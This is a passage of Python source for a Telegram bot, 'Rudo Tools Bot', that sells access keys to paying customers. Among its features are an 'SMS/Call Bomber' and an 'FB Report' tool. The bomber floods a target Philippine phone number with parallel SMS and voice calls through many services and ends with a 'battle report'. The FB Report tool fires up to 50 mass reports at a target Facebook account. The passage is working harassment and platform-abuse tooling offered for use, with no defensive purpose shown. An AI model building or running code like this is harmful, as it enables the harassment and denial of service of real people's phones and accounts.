async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_or_create_user(user_id, update.effective_user.username or "", update.effective_user.first_name or "")
    access_status = get_access_status(user_id)
    stats_text = (
        "╔════════════════════════════╗\n║     YOUR STATISTICS        ║\n╚════════════════════════════╝\n\n"
        f"▸ Name       : {user.first_name}\n▸ ID         : {user.user_id}\n▸ Access     : {access_status}\n"
        f"▸ Keys Used  : {user.total_keys_used}\n▸ Total Clicks: {user.total_clicks}\n"
        f"▸ Joined     : {datetime.fromtimestamp(user.joined_at).strftime('%Y-%m-%d')}"
    )
    await update.message.reply_text(stats_text)

async def fb_report_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_banned(user.id):
        await update.message.reply_text("× You are banned from this bot.")
        return
    if not has_access(user.id) and not is_admin(user.id):
        await update.message.reply_text("× You need access to use FB Report.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
        return
    context.user_data.clear()
    context.user_data['awaiting'] = 'fb_id'
    await update.message.reply_text("╔════════════════════════════╗\n║     FACEBOOK REPORT        ║\n╚════════════════════════════╝\n\n▸ Enter the Facebook ID of the target :\n▸ Example : 100012345678901\n\nType /cancel to go back.")

async def handle_fb_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fb_id = update.message.text.strip()
    if not fb_id.isdigit():
        await update.message.reply_text("× Invalid ID. Please enter numbers only.\n\nType /cancel to go back.")
        context.user_data['awaiting'] = 'fb_id'
        return
    context.user_data['fb_id'] = fb_id
    context.user_data['awaiting'] = 'fb_name'
    await update.message.reply_text("▸ Now enter the Facebook Name of the target :\n▸ Example : John Doe\n\nType /cancel to go back.")

async def handle_fb_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fb_name = update.message.text.strip()
    if len(fb_name) < 2:
        await update.message.reply_text("× Name too short. Please enter a valid name.\n\nType /cancel to go back.")
        context.user_data['awaiting'] = 'fb_name'
        return
    context.user_data['fb_name'] = fb_name
    context.user_data['awaiting'] = 'fb_count'
    await update.message.reply_text("▸ How many reports to send? (1-50)\n▸ Example : 10\n\nType /cancel to go back.")

async def handle_fb_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        count = int(text)
        if count < 1 or count > 50:
            raise ValueError("Count must be 1-50")
    except ValueError:
        await update.message.reply_text("× Invalid count. Please enter a number between 1 and 50.\n\nType /cancel to go back.")
        context.user_data['awaiting'] = 'fb_count'
        return
    fb_id = context.user_data.get('fb_id')
    fb_name = context.user_data.get('fb_name')
    if not fb_id or not fb_name:
        await update.message.reply_text("× Session expired. Please start again.")
        context.user_data.clear()
        return
    context.user_data.clear()
    progress_msg = await update.message.reply_text(f"▸ Starting FB Report...\n▸ Target : {fb_name} ({fb_id})\n▸ Count  : {count}\n\n▸ Please wait...")
    async with aiohttp.ClientSession() as session:
        await fb_report_worker(session, fb_id, fb_name, count, progress_msg, update)

async def sms_bomber_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_banned(user.id):
        await update.message.reply_text("× You are banned from this bot.")
        return
    if not has_access(user.id) and not is_admin(user.id):
        await update.message.reply_text("× You need access to use SMS/Call Bomber.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
        return
    context.user_data.clear()
    context.user_data['bomber_awaiting'] = 'phone'
    await update.message.reply_text("╔════════════════════════════╗\n║    SMS/CALL BOMBER         ║\n╚════════════════════════════╝\n\n▸ Enter target phone number:\n▸ Format: 09XXXXXXXXX or 9XXXXXXXXX\n\nType /cancel to go back.")

async def handle_bomber_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    valid = format_phone(phone)
    if len(valid) != 10 or not valid.startswith('9'):
        await update.message.reply_text("× Invalid Philippine number. Please try again.\n\nType /cancel to go back.")
        context.user_data['bomber_awaiting'] = 'phone'
        return
    context.user_data['bomber_phone'] = valid
    context.user_data['bomber_awaiting'] = 'rounds'
    await update.message.reply_text(f"▸ Target: {format_phone_display(valid)}\n\n▸ Enter SMS Rounds (1-10):\n▸ Example: 3\n\nType /cancel to go back.")

async def handle_bomber_rounds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        rounds = int(text)
        if rounds < 1 or rounds > 10:
            raise ValueError
    except:
        await update.message.reply_text("× Invalid. Enter a number between 1 and 10.\n\nType /cancel to go back.")
        context.user_data['bomber_awaiting'] = 'rounds'
        return
    context.user_data['bomber_rounds'] = rounds
    context.user_data['bomber_awaiting'] = 'calls'
    await update.message.reply_text(f"▸ SMS Rounds: {rounds}\n\n▸ Enter Voice Calls (1-10):\n▸ Example: 3\n\nType /cancel to go back.")

async def handle_bomber_calls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    try:
        calls = int(text)
        if calls < 1 or calls > 10:
            raise ValueError
    except:
        await update.message.reply_text("× Invalid. Enter a number between 1 and 10.\n\nType /cancel to go back.")
        context.user_data['bomber_awaiting'] = 'calls'
        return
    context.user_data['bomber_calls'] = calls
    context.user_data['bomber_awaiting'] = 'confirm'
    phone = context.user_data.get('bomber_phone')
    rounds = context.user_data.get('bomber_rounds')
    
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔥 DEPLOY", callback_data="bomber:deploy")],
        [InlineKeyboardButton("× CANCEL", callback_data="bomber:cancel")]
    ])
    
    await update.message.reply_text(
        f"╔════════════════════════════╗\n║    RAPID FIRE CONFIG       ║\n╚════════════════════════════╝\n\n"
        f"▸ Target : {format_phone_display(phone)}\n▸ SMS Rounds : {rounds}\n▸ Voice Calls : {calls}\n\n"
        f"▸ Are you sure you want to deploy?",
        reply_markup=kb
    )

async def handle_bomber_deploy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "bomber:cancel":
        context.user_data.clear()
        await query.edit_message_text("× Operation cancelled.")
        return
        
    phone = context.user_data.get('bomber_phone')
    rounds = context.user_data.get('bomber_rounds')
    calls = context.user_data.get('bomber_calls')
    
    if not phone or not rounds or not calls:
        await query.edit_message_text("× Session expired. Please start again.")
        return
        
    context.user_data.clear()
    await query.edit_message_text("🔥 RAPID FIRE DEPLOYED\n\n▸ Launching parallel attacks...")
    
    start_time = time.time()
    
    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = []
        for _ in range(rounds):
            for name, func in SMS_SERVICES:
                futures.append(loop.run_in_executor(executor, func, phone))
        for _ in range(calls):
            for name, func in VOICE_SERVICES:
                futures.append(loop.run_in_executor(executor, func, phone))
        
        results = await asyncio.gather(*futures)
        
    sms_success = 0
    sms_total = 0
    voice_success = 0
    voice_total = 0
    
    idx = 0
    for _ in range(rounds):
        for name, _ in SMS_SERVICES:
            sms_total += 1
            if results[idx]: sms_success += 1
            idx += 1
            
    for _ in range(calls):
        for name, _ in VOICE_SERVICES:
            voice_total += 1
            if results[idx]: voice_success += 1
            idx += 1
            
    elapsed = time.time() - start_time
    
    report = (
        f"╔════════════════════════════╗\n║      BATTLE REPORT         ║\n╚════════════════════════════╝\n\n"
        f"▸ Target    : {format_phone_display(phone)}\n▸ Time      : {elapsed:.2f} seconds\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"▸ SMS OK    : {sms_success}/{sms_total} ({sms_success*100//sms_total if sms_total > 0 else 0}%)\n"
        f"▸ SMS FAIL  : {sms_total - sms_success}/{sms_total}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"▸ CALL OK   : {voice_success}/{voice_total} ({voice_success*100//voice_total if voice_total > 0 else 0}%)\n"
        f"▸ CALL FAIL : {voice_total - voice_success}/{voice_total}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"▸ TOTAL     : {sms_success + voice_success}/{sms_total + voice_total}\n\n"
        f"▸ Attack Complete!"
    )
    
    await query.edit_message_text(report)

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("× Admin only.")
        return
    context.user_data.clear()
    await update.message.reply_text("╔════════════════════════════╗\n║      ADMIN PANEL           ║\n╚════════════════════════════╝\n\n▸ Select an option below :", reply_markup=admin_keyboard())

async def generate_key_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("× Admin only.")
        return
    context.user_data.clear()
    await update.message.reply_text("╔════════════════════════════╗\n║   GENERATE ACCESS KEY      ║\n╚════════════════════════════╝\n\n▸ Choose key type :", reply_markup=key_type_keyboard())

async def handle_key_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    try:
        if data == "cancel":
            context.user_data.clear()
            await query.edit_message_text("× Operation cancelled.")
            return
        if data.startswith("keytype:"):
            key_type = data.split(":")[1]
            if key_type == "lifetime":
                key = create_access_key(is_lifetime=True, created_by=query.from_user.id)
                await query.edit_message_text(f"╔════════════════════════════╗\n║    KEY CREATED SUCCESS     ║\n╚════════════════════════════╝\n\n▸ Key      : {key.key}\n▸ Duration : LIFETIME\n▸ Status   : Available\n\nSend this key to your customer.")
                context.user_data.clear()
                return
            elif key_type == "custom":
                context.user_data['awaiting'] = 'key_duration'
                await query.edit_message_text("╔════════════════════════════╗\n║    CUSTOM KEY DURATION     ║\n╚════════════════════════════╝\n\n▸ Enter duration in format :\n▸ days,hours\n\nExamples :\n  ◈ 3,0   = 3 days\n  ◈ 0,12  = 12 hours\n  ◈ 7,12  = 7 days 12 hours\n\nType /cancel to cancel.")
                return
    except Exception as e:
        logger.error(f"KEYGEN ERROR: {type(e).__name__}: {e}")

async def handle_key_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    context.user_data.pop('awaiting', None)
    try:
        days_str, hours_str = text.split(',')
        days = int(days_str.strip())
        hours = int(hours_str.strip())
        if days < 0 or hours < 0: raise ValueError("Negative values not allowed")
        if days == 0 and hours == 0: raise ValueError("Duration cannot be zero")
        if days > 365: raise ValueError("Days cannot exceed 365")
        if hours > 23: raise ValueError("Hours cannot exceed 23")
    except ValueError as e:
        await update.message.reply_text(f"× Invalid input : {e}\n\n▸ Use format : days,hours\n▸ Example : 3,0 for 3 days\n\nType /cancel to cancel.")
        context.user_data['awaiting'] = 'key_duration'
        return
    key = create_access_key(duration_days=days, duration_hours=hours, created_by=update.effective_user.id)
    await update.message.reply_text(f"╔════════════════════════════╗\n║    KEY CREATED SUCCESS     ║\n╚════════════════════════════╝\n\n▸ Key      : {key.key}\n▸ Duration : {days}D {hours}H\n▸ Status   : Available\n\nSend this key to your customer.")

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    if not KEYS:
        await update.message.reply_text("× No keys generated yet.")
        return
    keys_list = sorted(KEYS.values(), key=lambda x: x.created_at, reverse=True)[:20]
    message = "╔════════════════════════════╗\n║      RECENT KEYS           ║\n╚════════════════════════════╝\n\n"
    for key in keys_list:
        if key.revoked: status = "REVOKED"
        elif key.used_by:
            user = USERS.get(key.used_by)
            status = f"USED BY {user.username if user else 'Unknown'}"
        elif time.time() > key.expires_at: status = "EXPIRED"
        else: status = "AVAILABLE"
        duration = "LIFETIME" if key.is_lifetime else f"{key.duration_days}D {key.duration_hours}H"
        message += f"▸ Key      : {key.key}\n▸ Duration : {duration}\n▸ Status   : {status}\n━━━━━━━━━━━━━━━━━━━━\n"
    await update.message.reply_text(message)

async def global_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    total_users = len(USERS)
    active_users = sum(1 for u in USERS.values() if has_access(u.user_id))
    total_keys = len(KEYS)
    used_keys = sum(1 for k in KEYS.values() if k.used_by)
    stats_text = (
        "╔════════════════════════════╗\n║     GLOBAL STATISTICS      ║\n╚════════════════════════════╝\n\n"
        f"▸ Total Users   : {total_users}\n▸ Active Users  : {active_users}\n▸ Total Keys    : {total_keys}\n"
        f"▸ Used Keys     : {used_keys}\n▸ Total Clicks  : {SETTINGS.total_clicks}\n▸ Maintenance   : {'ON' if SETTINGS.maintenance_mode else 'OFF'}"
    )
    await update.message.reply_text(stats_text)

async def revoke_key_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    context.user_data.clear()
    context.user_data['awaiting'] = 'revoke_key'
    await update.message.reply_text("╔════════════════════════════╗\n║      REVOKE KEY            ║\n╚════════════════════════════╝\n\n▸ Enter the key to revoke :\n▸ Format : CLOUT-XXXXXXXXXXXX\n\nType /cancel to cancel.")

async def handle_revoke_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key_string = update.message.text.strip().upper()
    context.user_data.pop('awaiting', None)
    result = revoke_key(key_string)
    await update.message.reply_text(result['message'])

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    context.user_data.clear()
    context.user_data['awaiting'] = 'broadcast'
    await update.message.reply_text("╔════════════════════════════╗\n║     BROADCAST MESSAGE      ║\n╚════════════════════════════╝\n\n▸ Send the message to broadcast :\nType /cancel to cancel.")

async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    context.user_data.pop('awaiting', None)
    success = 0
    failed = 0
    status_msg = await update.message.reply_text(f"▸ Sending broadcast to {len(USERS)} users...")
    for user_id in USERS:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await status_msg.edit_text(f"╔════════════════════════════╗\n║    BROADCAST COMPLETE      ║\n╚════════════════════════════╝\n\n▸ Success : {success}\n▸ Failed  : {failed}")

async def toggle_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    SETTINGS.maintenance_mode = not SETTINGS.maintenance_mode
    save_settings()
    status = "ON" if SETTINGS.maintenance_mode else "OFF"
    await update.message.reply_text(f"▸ Maintenance mode : {status}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("× Operation cancelled.", reply_markup=main_keyboard(update.effective_user.id))

async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    get_or_create_user(user.id, user.username or "", user.first_name or "")

    awaiting = context.user_data.get('awaiting')
    bomber_awaiting = context.user_data.get('bomber_awaiting')

    if bomber_awaiting == 'phone':
        await handle_bomber_phone(update, context)
        return
    if bomber_awaiting == 'rounds':
        await handle_bomber_rounds(update, context)
        return
    if bomber_awaiting == 'calls':
        await handle_bomber_calls(update, context)
        return

    if awaiting == 'fb_id':
        await handle_fb_id(update, context)
        return
    if awaiting == 'fb_name':
        await handle_fb_name(update, context)
        return
    if awaiting == 'fb_count':
        await handle_fb_count(update, context)
        return
    if awaiting == 'key':
        await handle_key_input(update, context)
        return
    if awaiting == 'key_duration':
        await handle_key_duration(update, context)
        return
    if awaiting == 'broadcast':
        await handle_broadcast(update, context)
        return
    if awaiting == 'revoke_key':
        await handle_revoke_key(update, context)
        return

    if "tiktok.com" in text.lower():
        if not has_access(user.id) and not is_admin(user.id):
            await update.message.reply_text("× You need access to use the TikTok Downloader.\n\n▸ Use '▸ Get Access' to redeem a key.", reply_markup=main_keyboard(user.id))
            return
        urls = [word for word in text.split() if "tiktok.com" in word.lower()]
        if urls:
            await download_tiktok_video(update, context, urls[0])
            return

    if text == "▸ Boost Services":
        await boost_services(update, context)
    elif text == "▸ TikTok Downloader":
        await update.message.reply_text("▸ Send me any TikTok video link and I will download it for you!\n\nExample:\nhttps://vt.tiktok.com/ZSpYgeCoc/")
    elif text == "▸ FB Report":
        await fb_report_menu(update, context)
    elif text == "▸ SMS/Call Bomber":
        await sms_bomber_menu(update, context)
    elif text == "▸ Get Access":
        await get_access(update, context)
    elif text == "▸ Redeem Key":
        await get_access(update, context)
    elif text == "▸ My Statistics":
        await my_stats(update, context)
    elif text == "▸ Help":
        await start(update, context)
    elif text == "▸ Admin Panel" and is_admin(user.id):
        await admin_panel(update, context)
    elif text == "▸ Generate Key" and is_admin(user.id):
        await generate_key_admin(update, context)
    elif text == "▸ List Keys" and is_admin(user.id):
        await list_keys(update, context)
    elif text == "▸ Global Stats" and is_admin(user.id):
        await global_stats(update, context)
    elif text == "▸ Revoke Key" and is_admin(user.id):
        await revoke_key_admin(update, context)
    elif text == "▸ Broadcast" and is_admin(user.id):
        await broadcast(update, context)
    elif text == "▸ Settings" and is_admin(user.id):
        await toggle_maintenance(update, context)
    elif text == "▸ Main Menu":
        await start(update, context)
    else:
        await update.message.reply_text("× Invalid option.\n▸ Please use the menu buttons below.", reply_markup=main_keyboard(user.id))

def main():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        return
    load_state()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_error_handler(error_handler)

    application.add_handler(CallbackQueryHandler(handle_key_generation, pattern="^keytype:"))
    application.add_handler(CallbackQueryHandler(handle_key_generation, pattern="^cancel$"))
    application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^category:"))
    application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^back_to_categories$"))
    application.add_handler(CallbackQueryHandler(handle_boost_selection, pattern="^main_menu$"))
    application.add_handler(CallbackQueryHandler(handle_bomber_deploy, pattern="^bomber:"))

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stats", my_stats))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("whoami", whoami))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("genkey", generate_key_admin))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_menu))

    logger.info("Rudo Tools Bot with SMS/Call Bomber started!")
    application.run_polling(stop_signals=None)

if __name__ == "__main__":
    main()
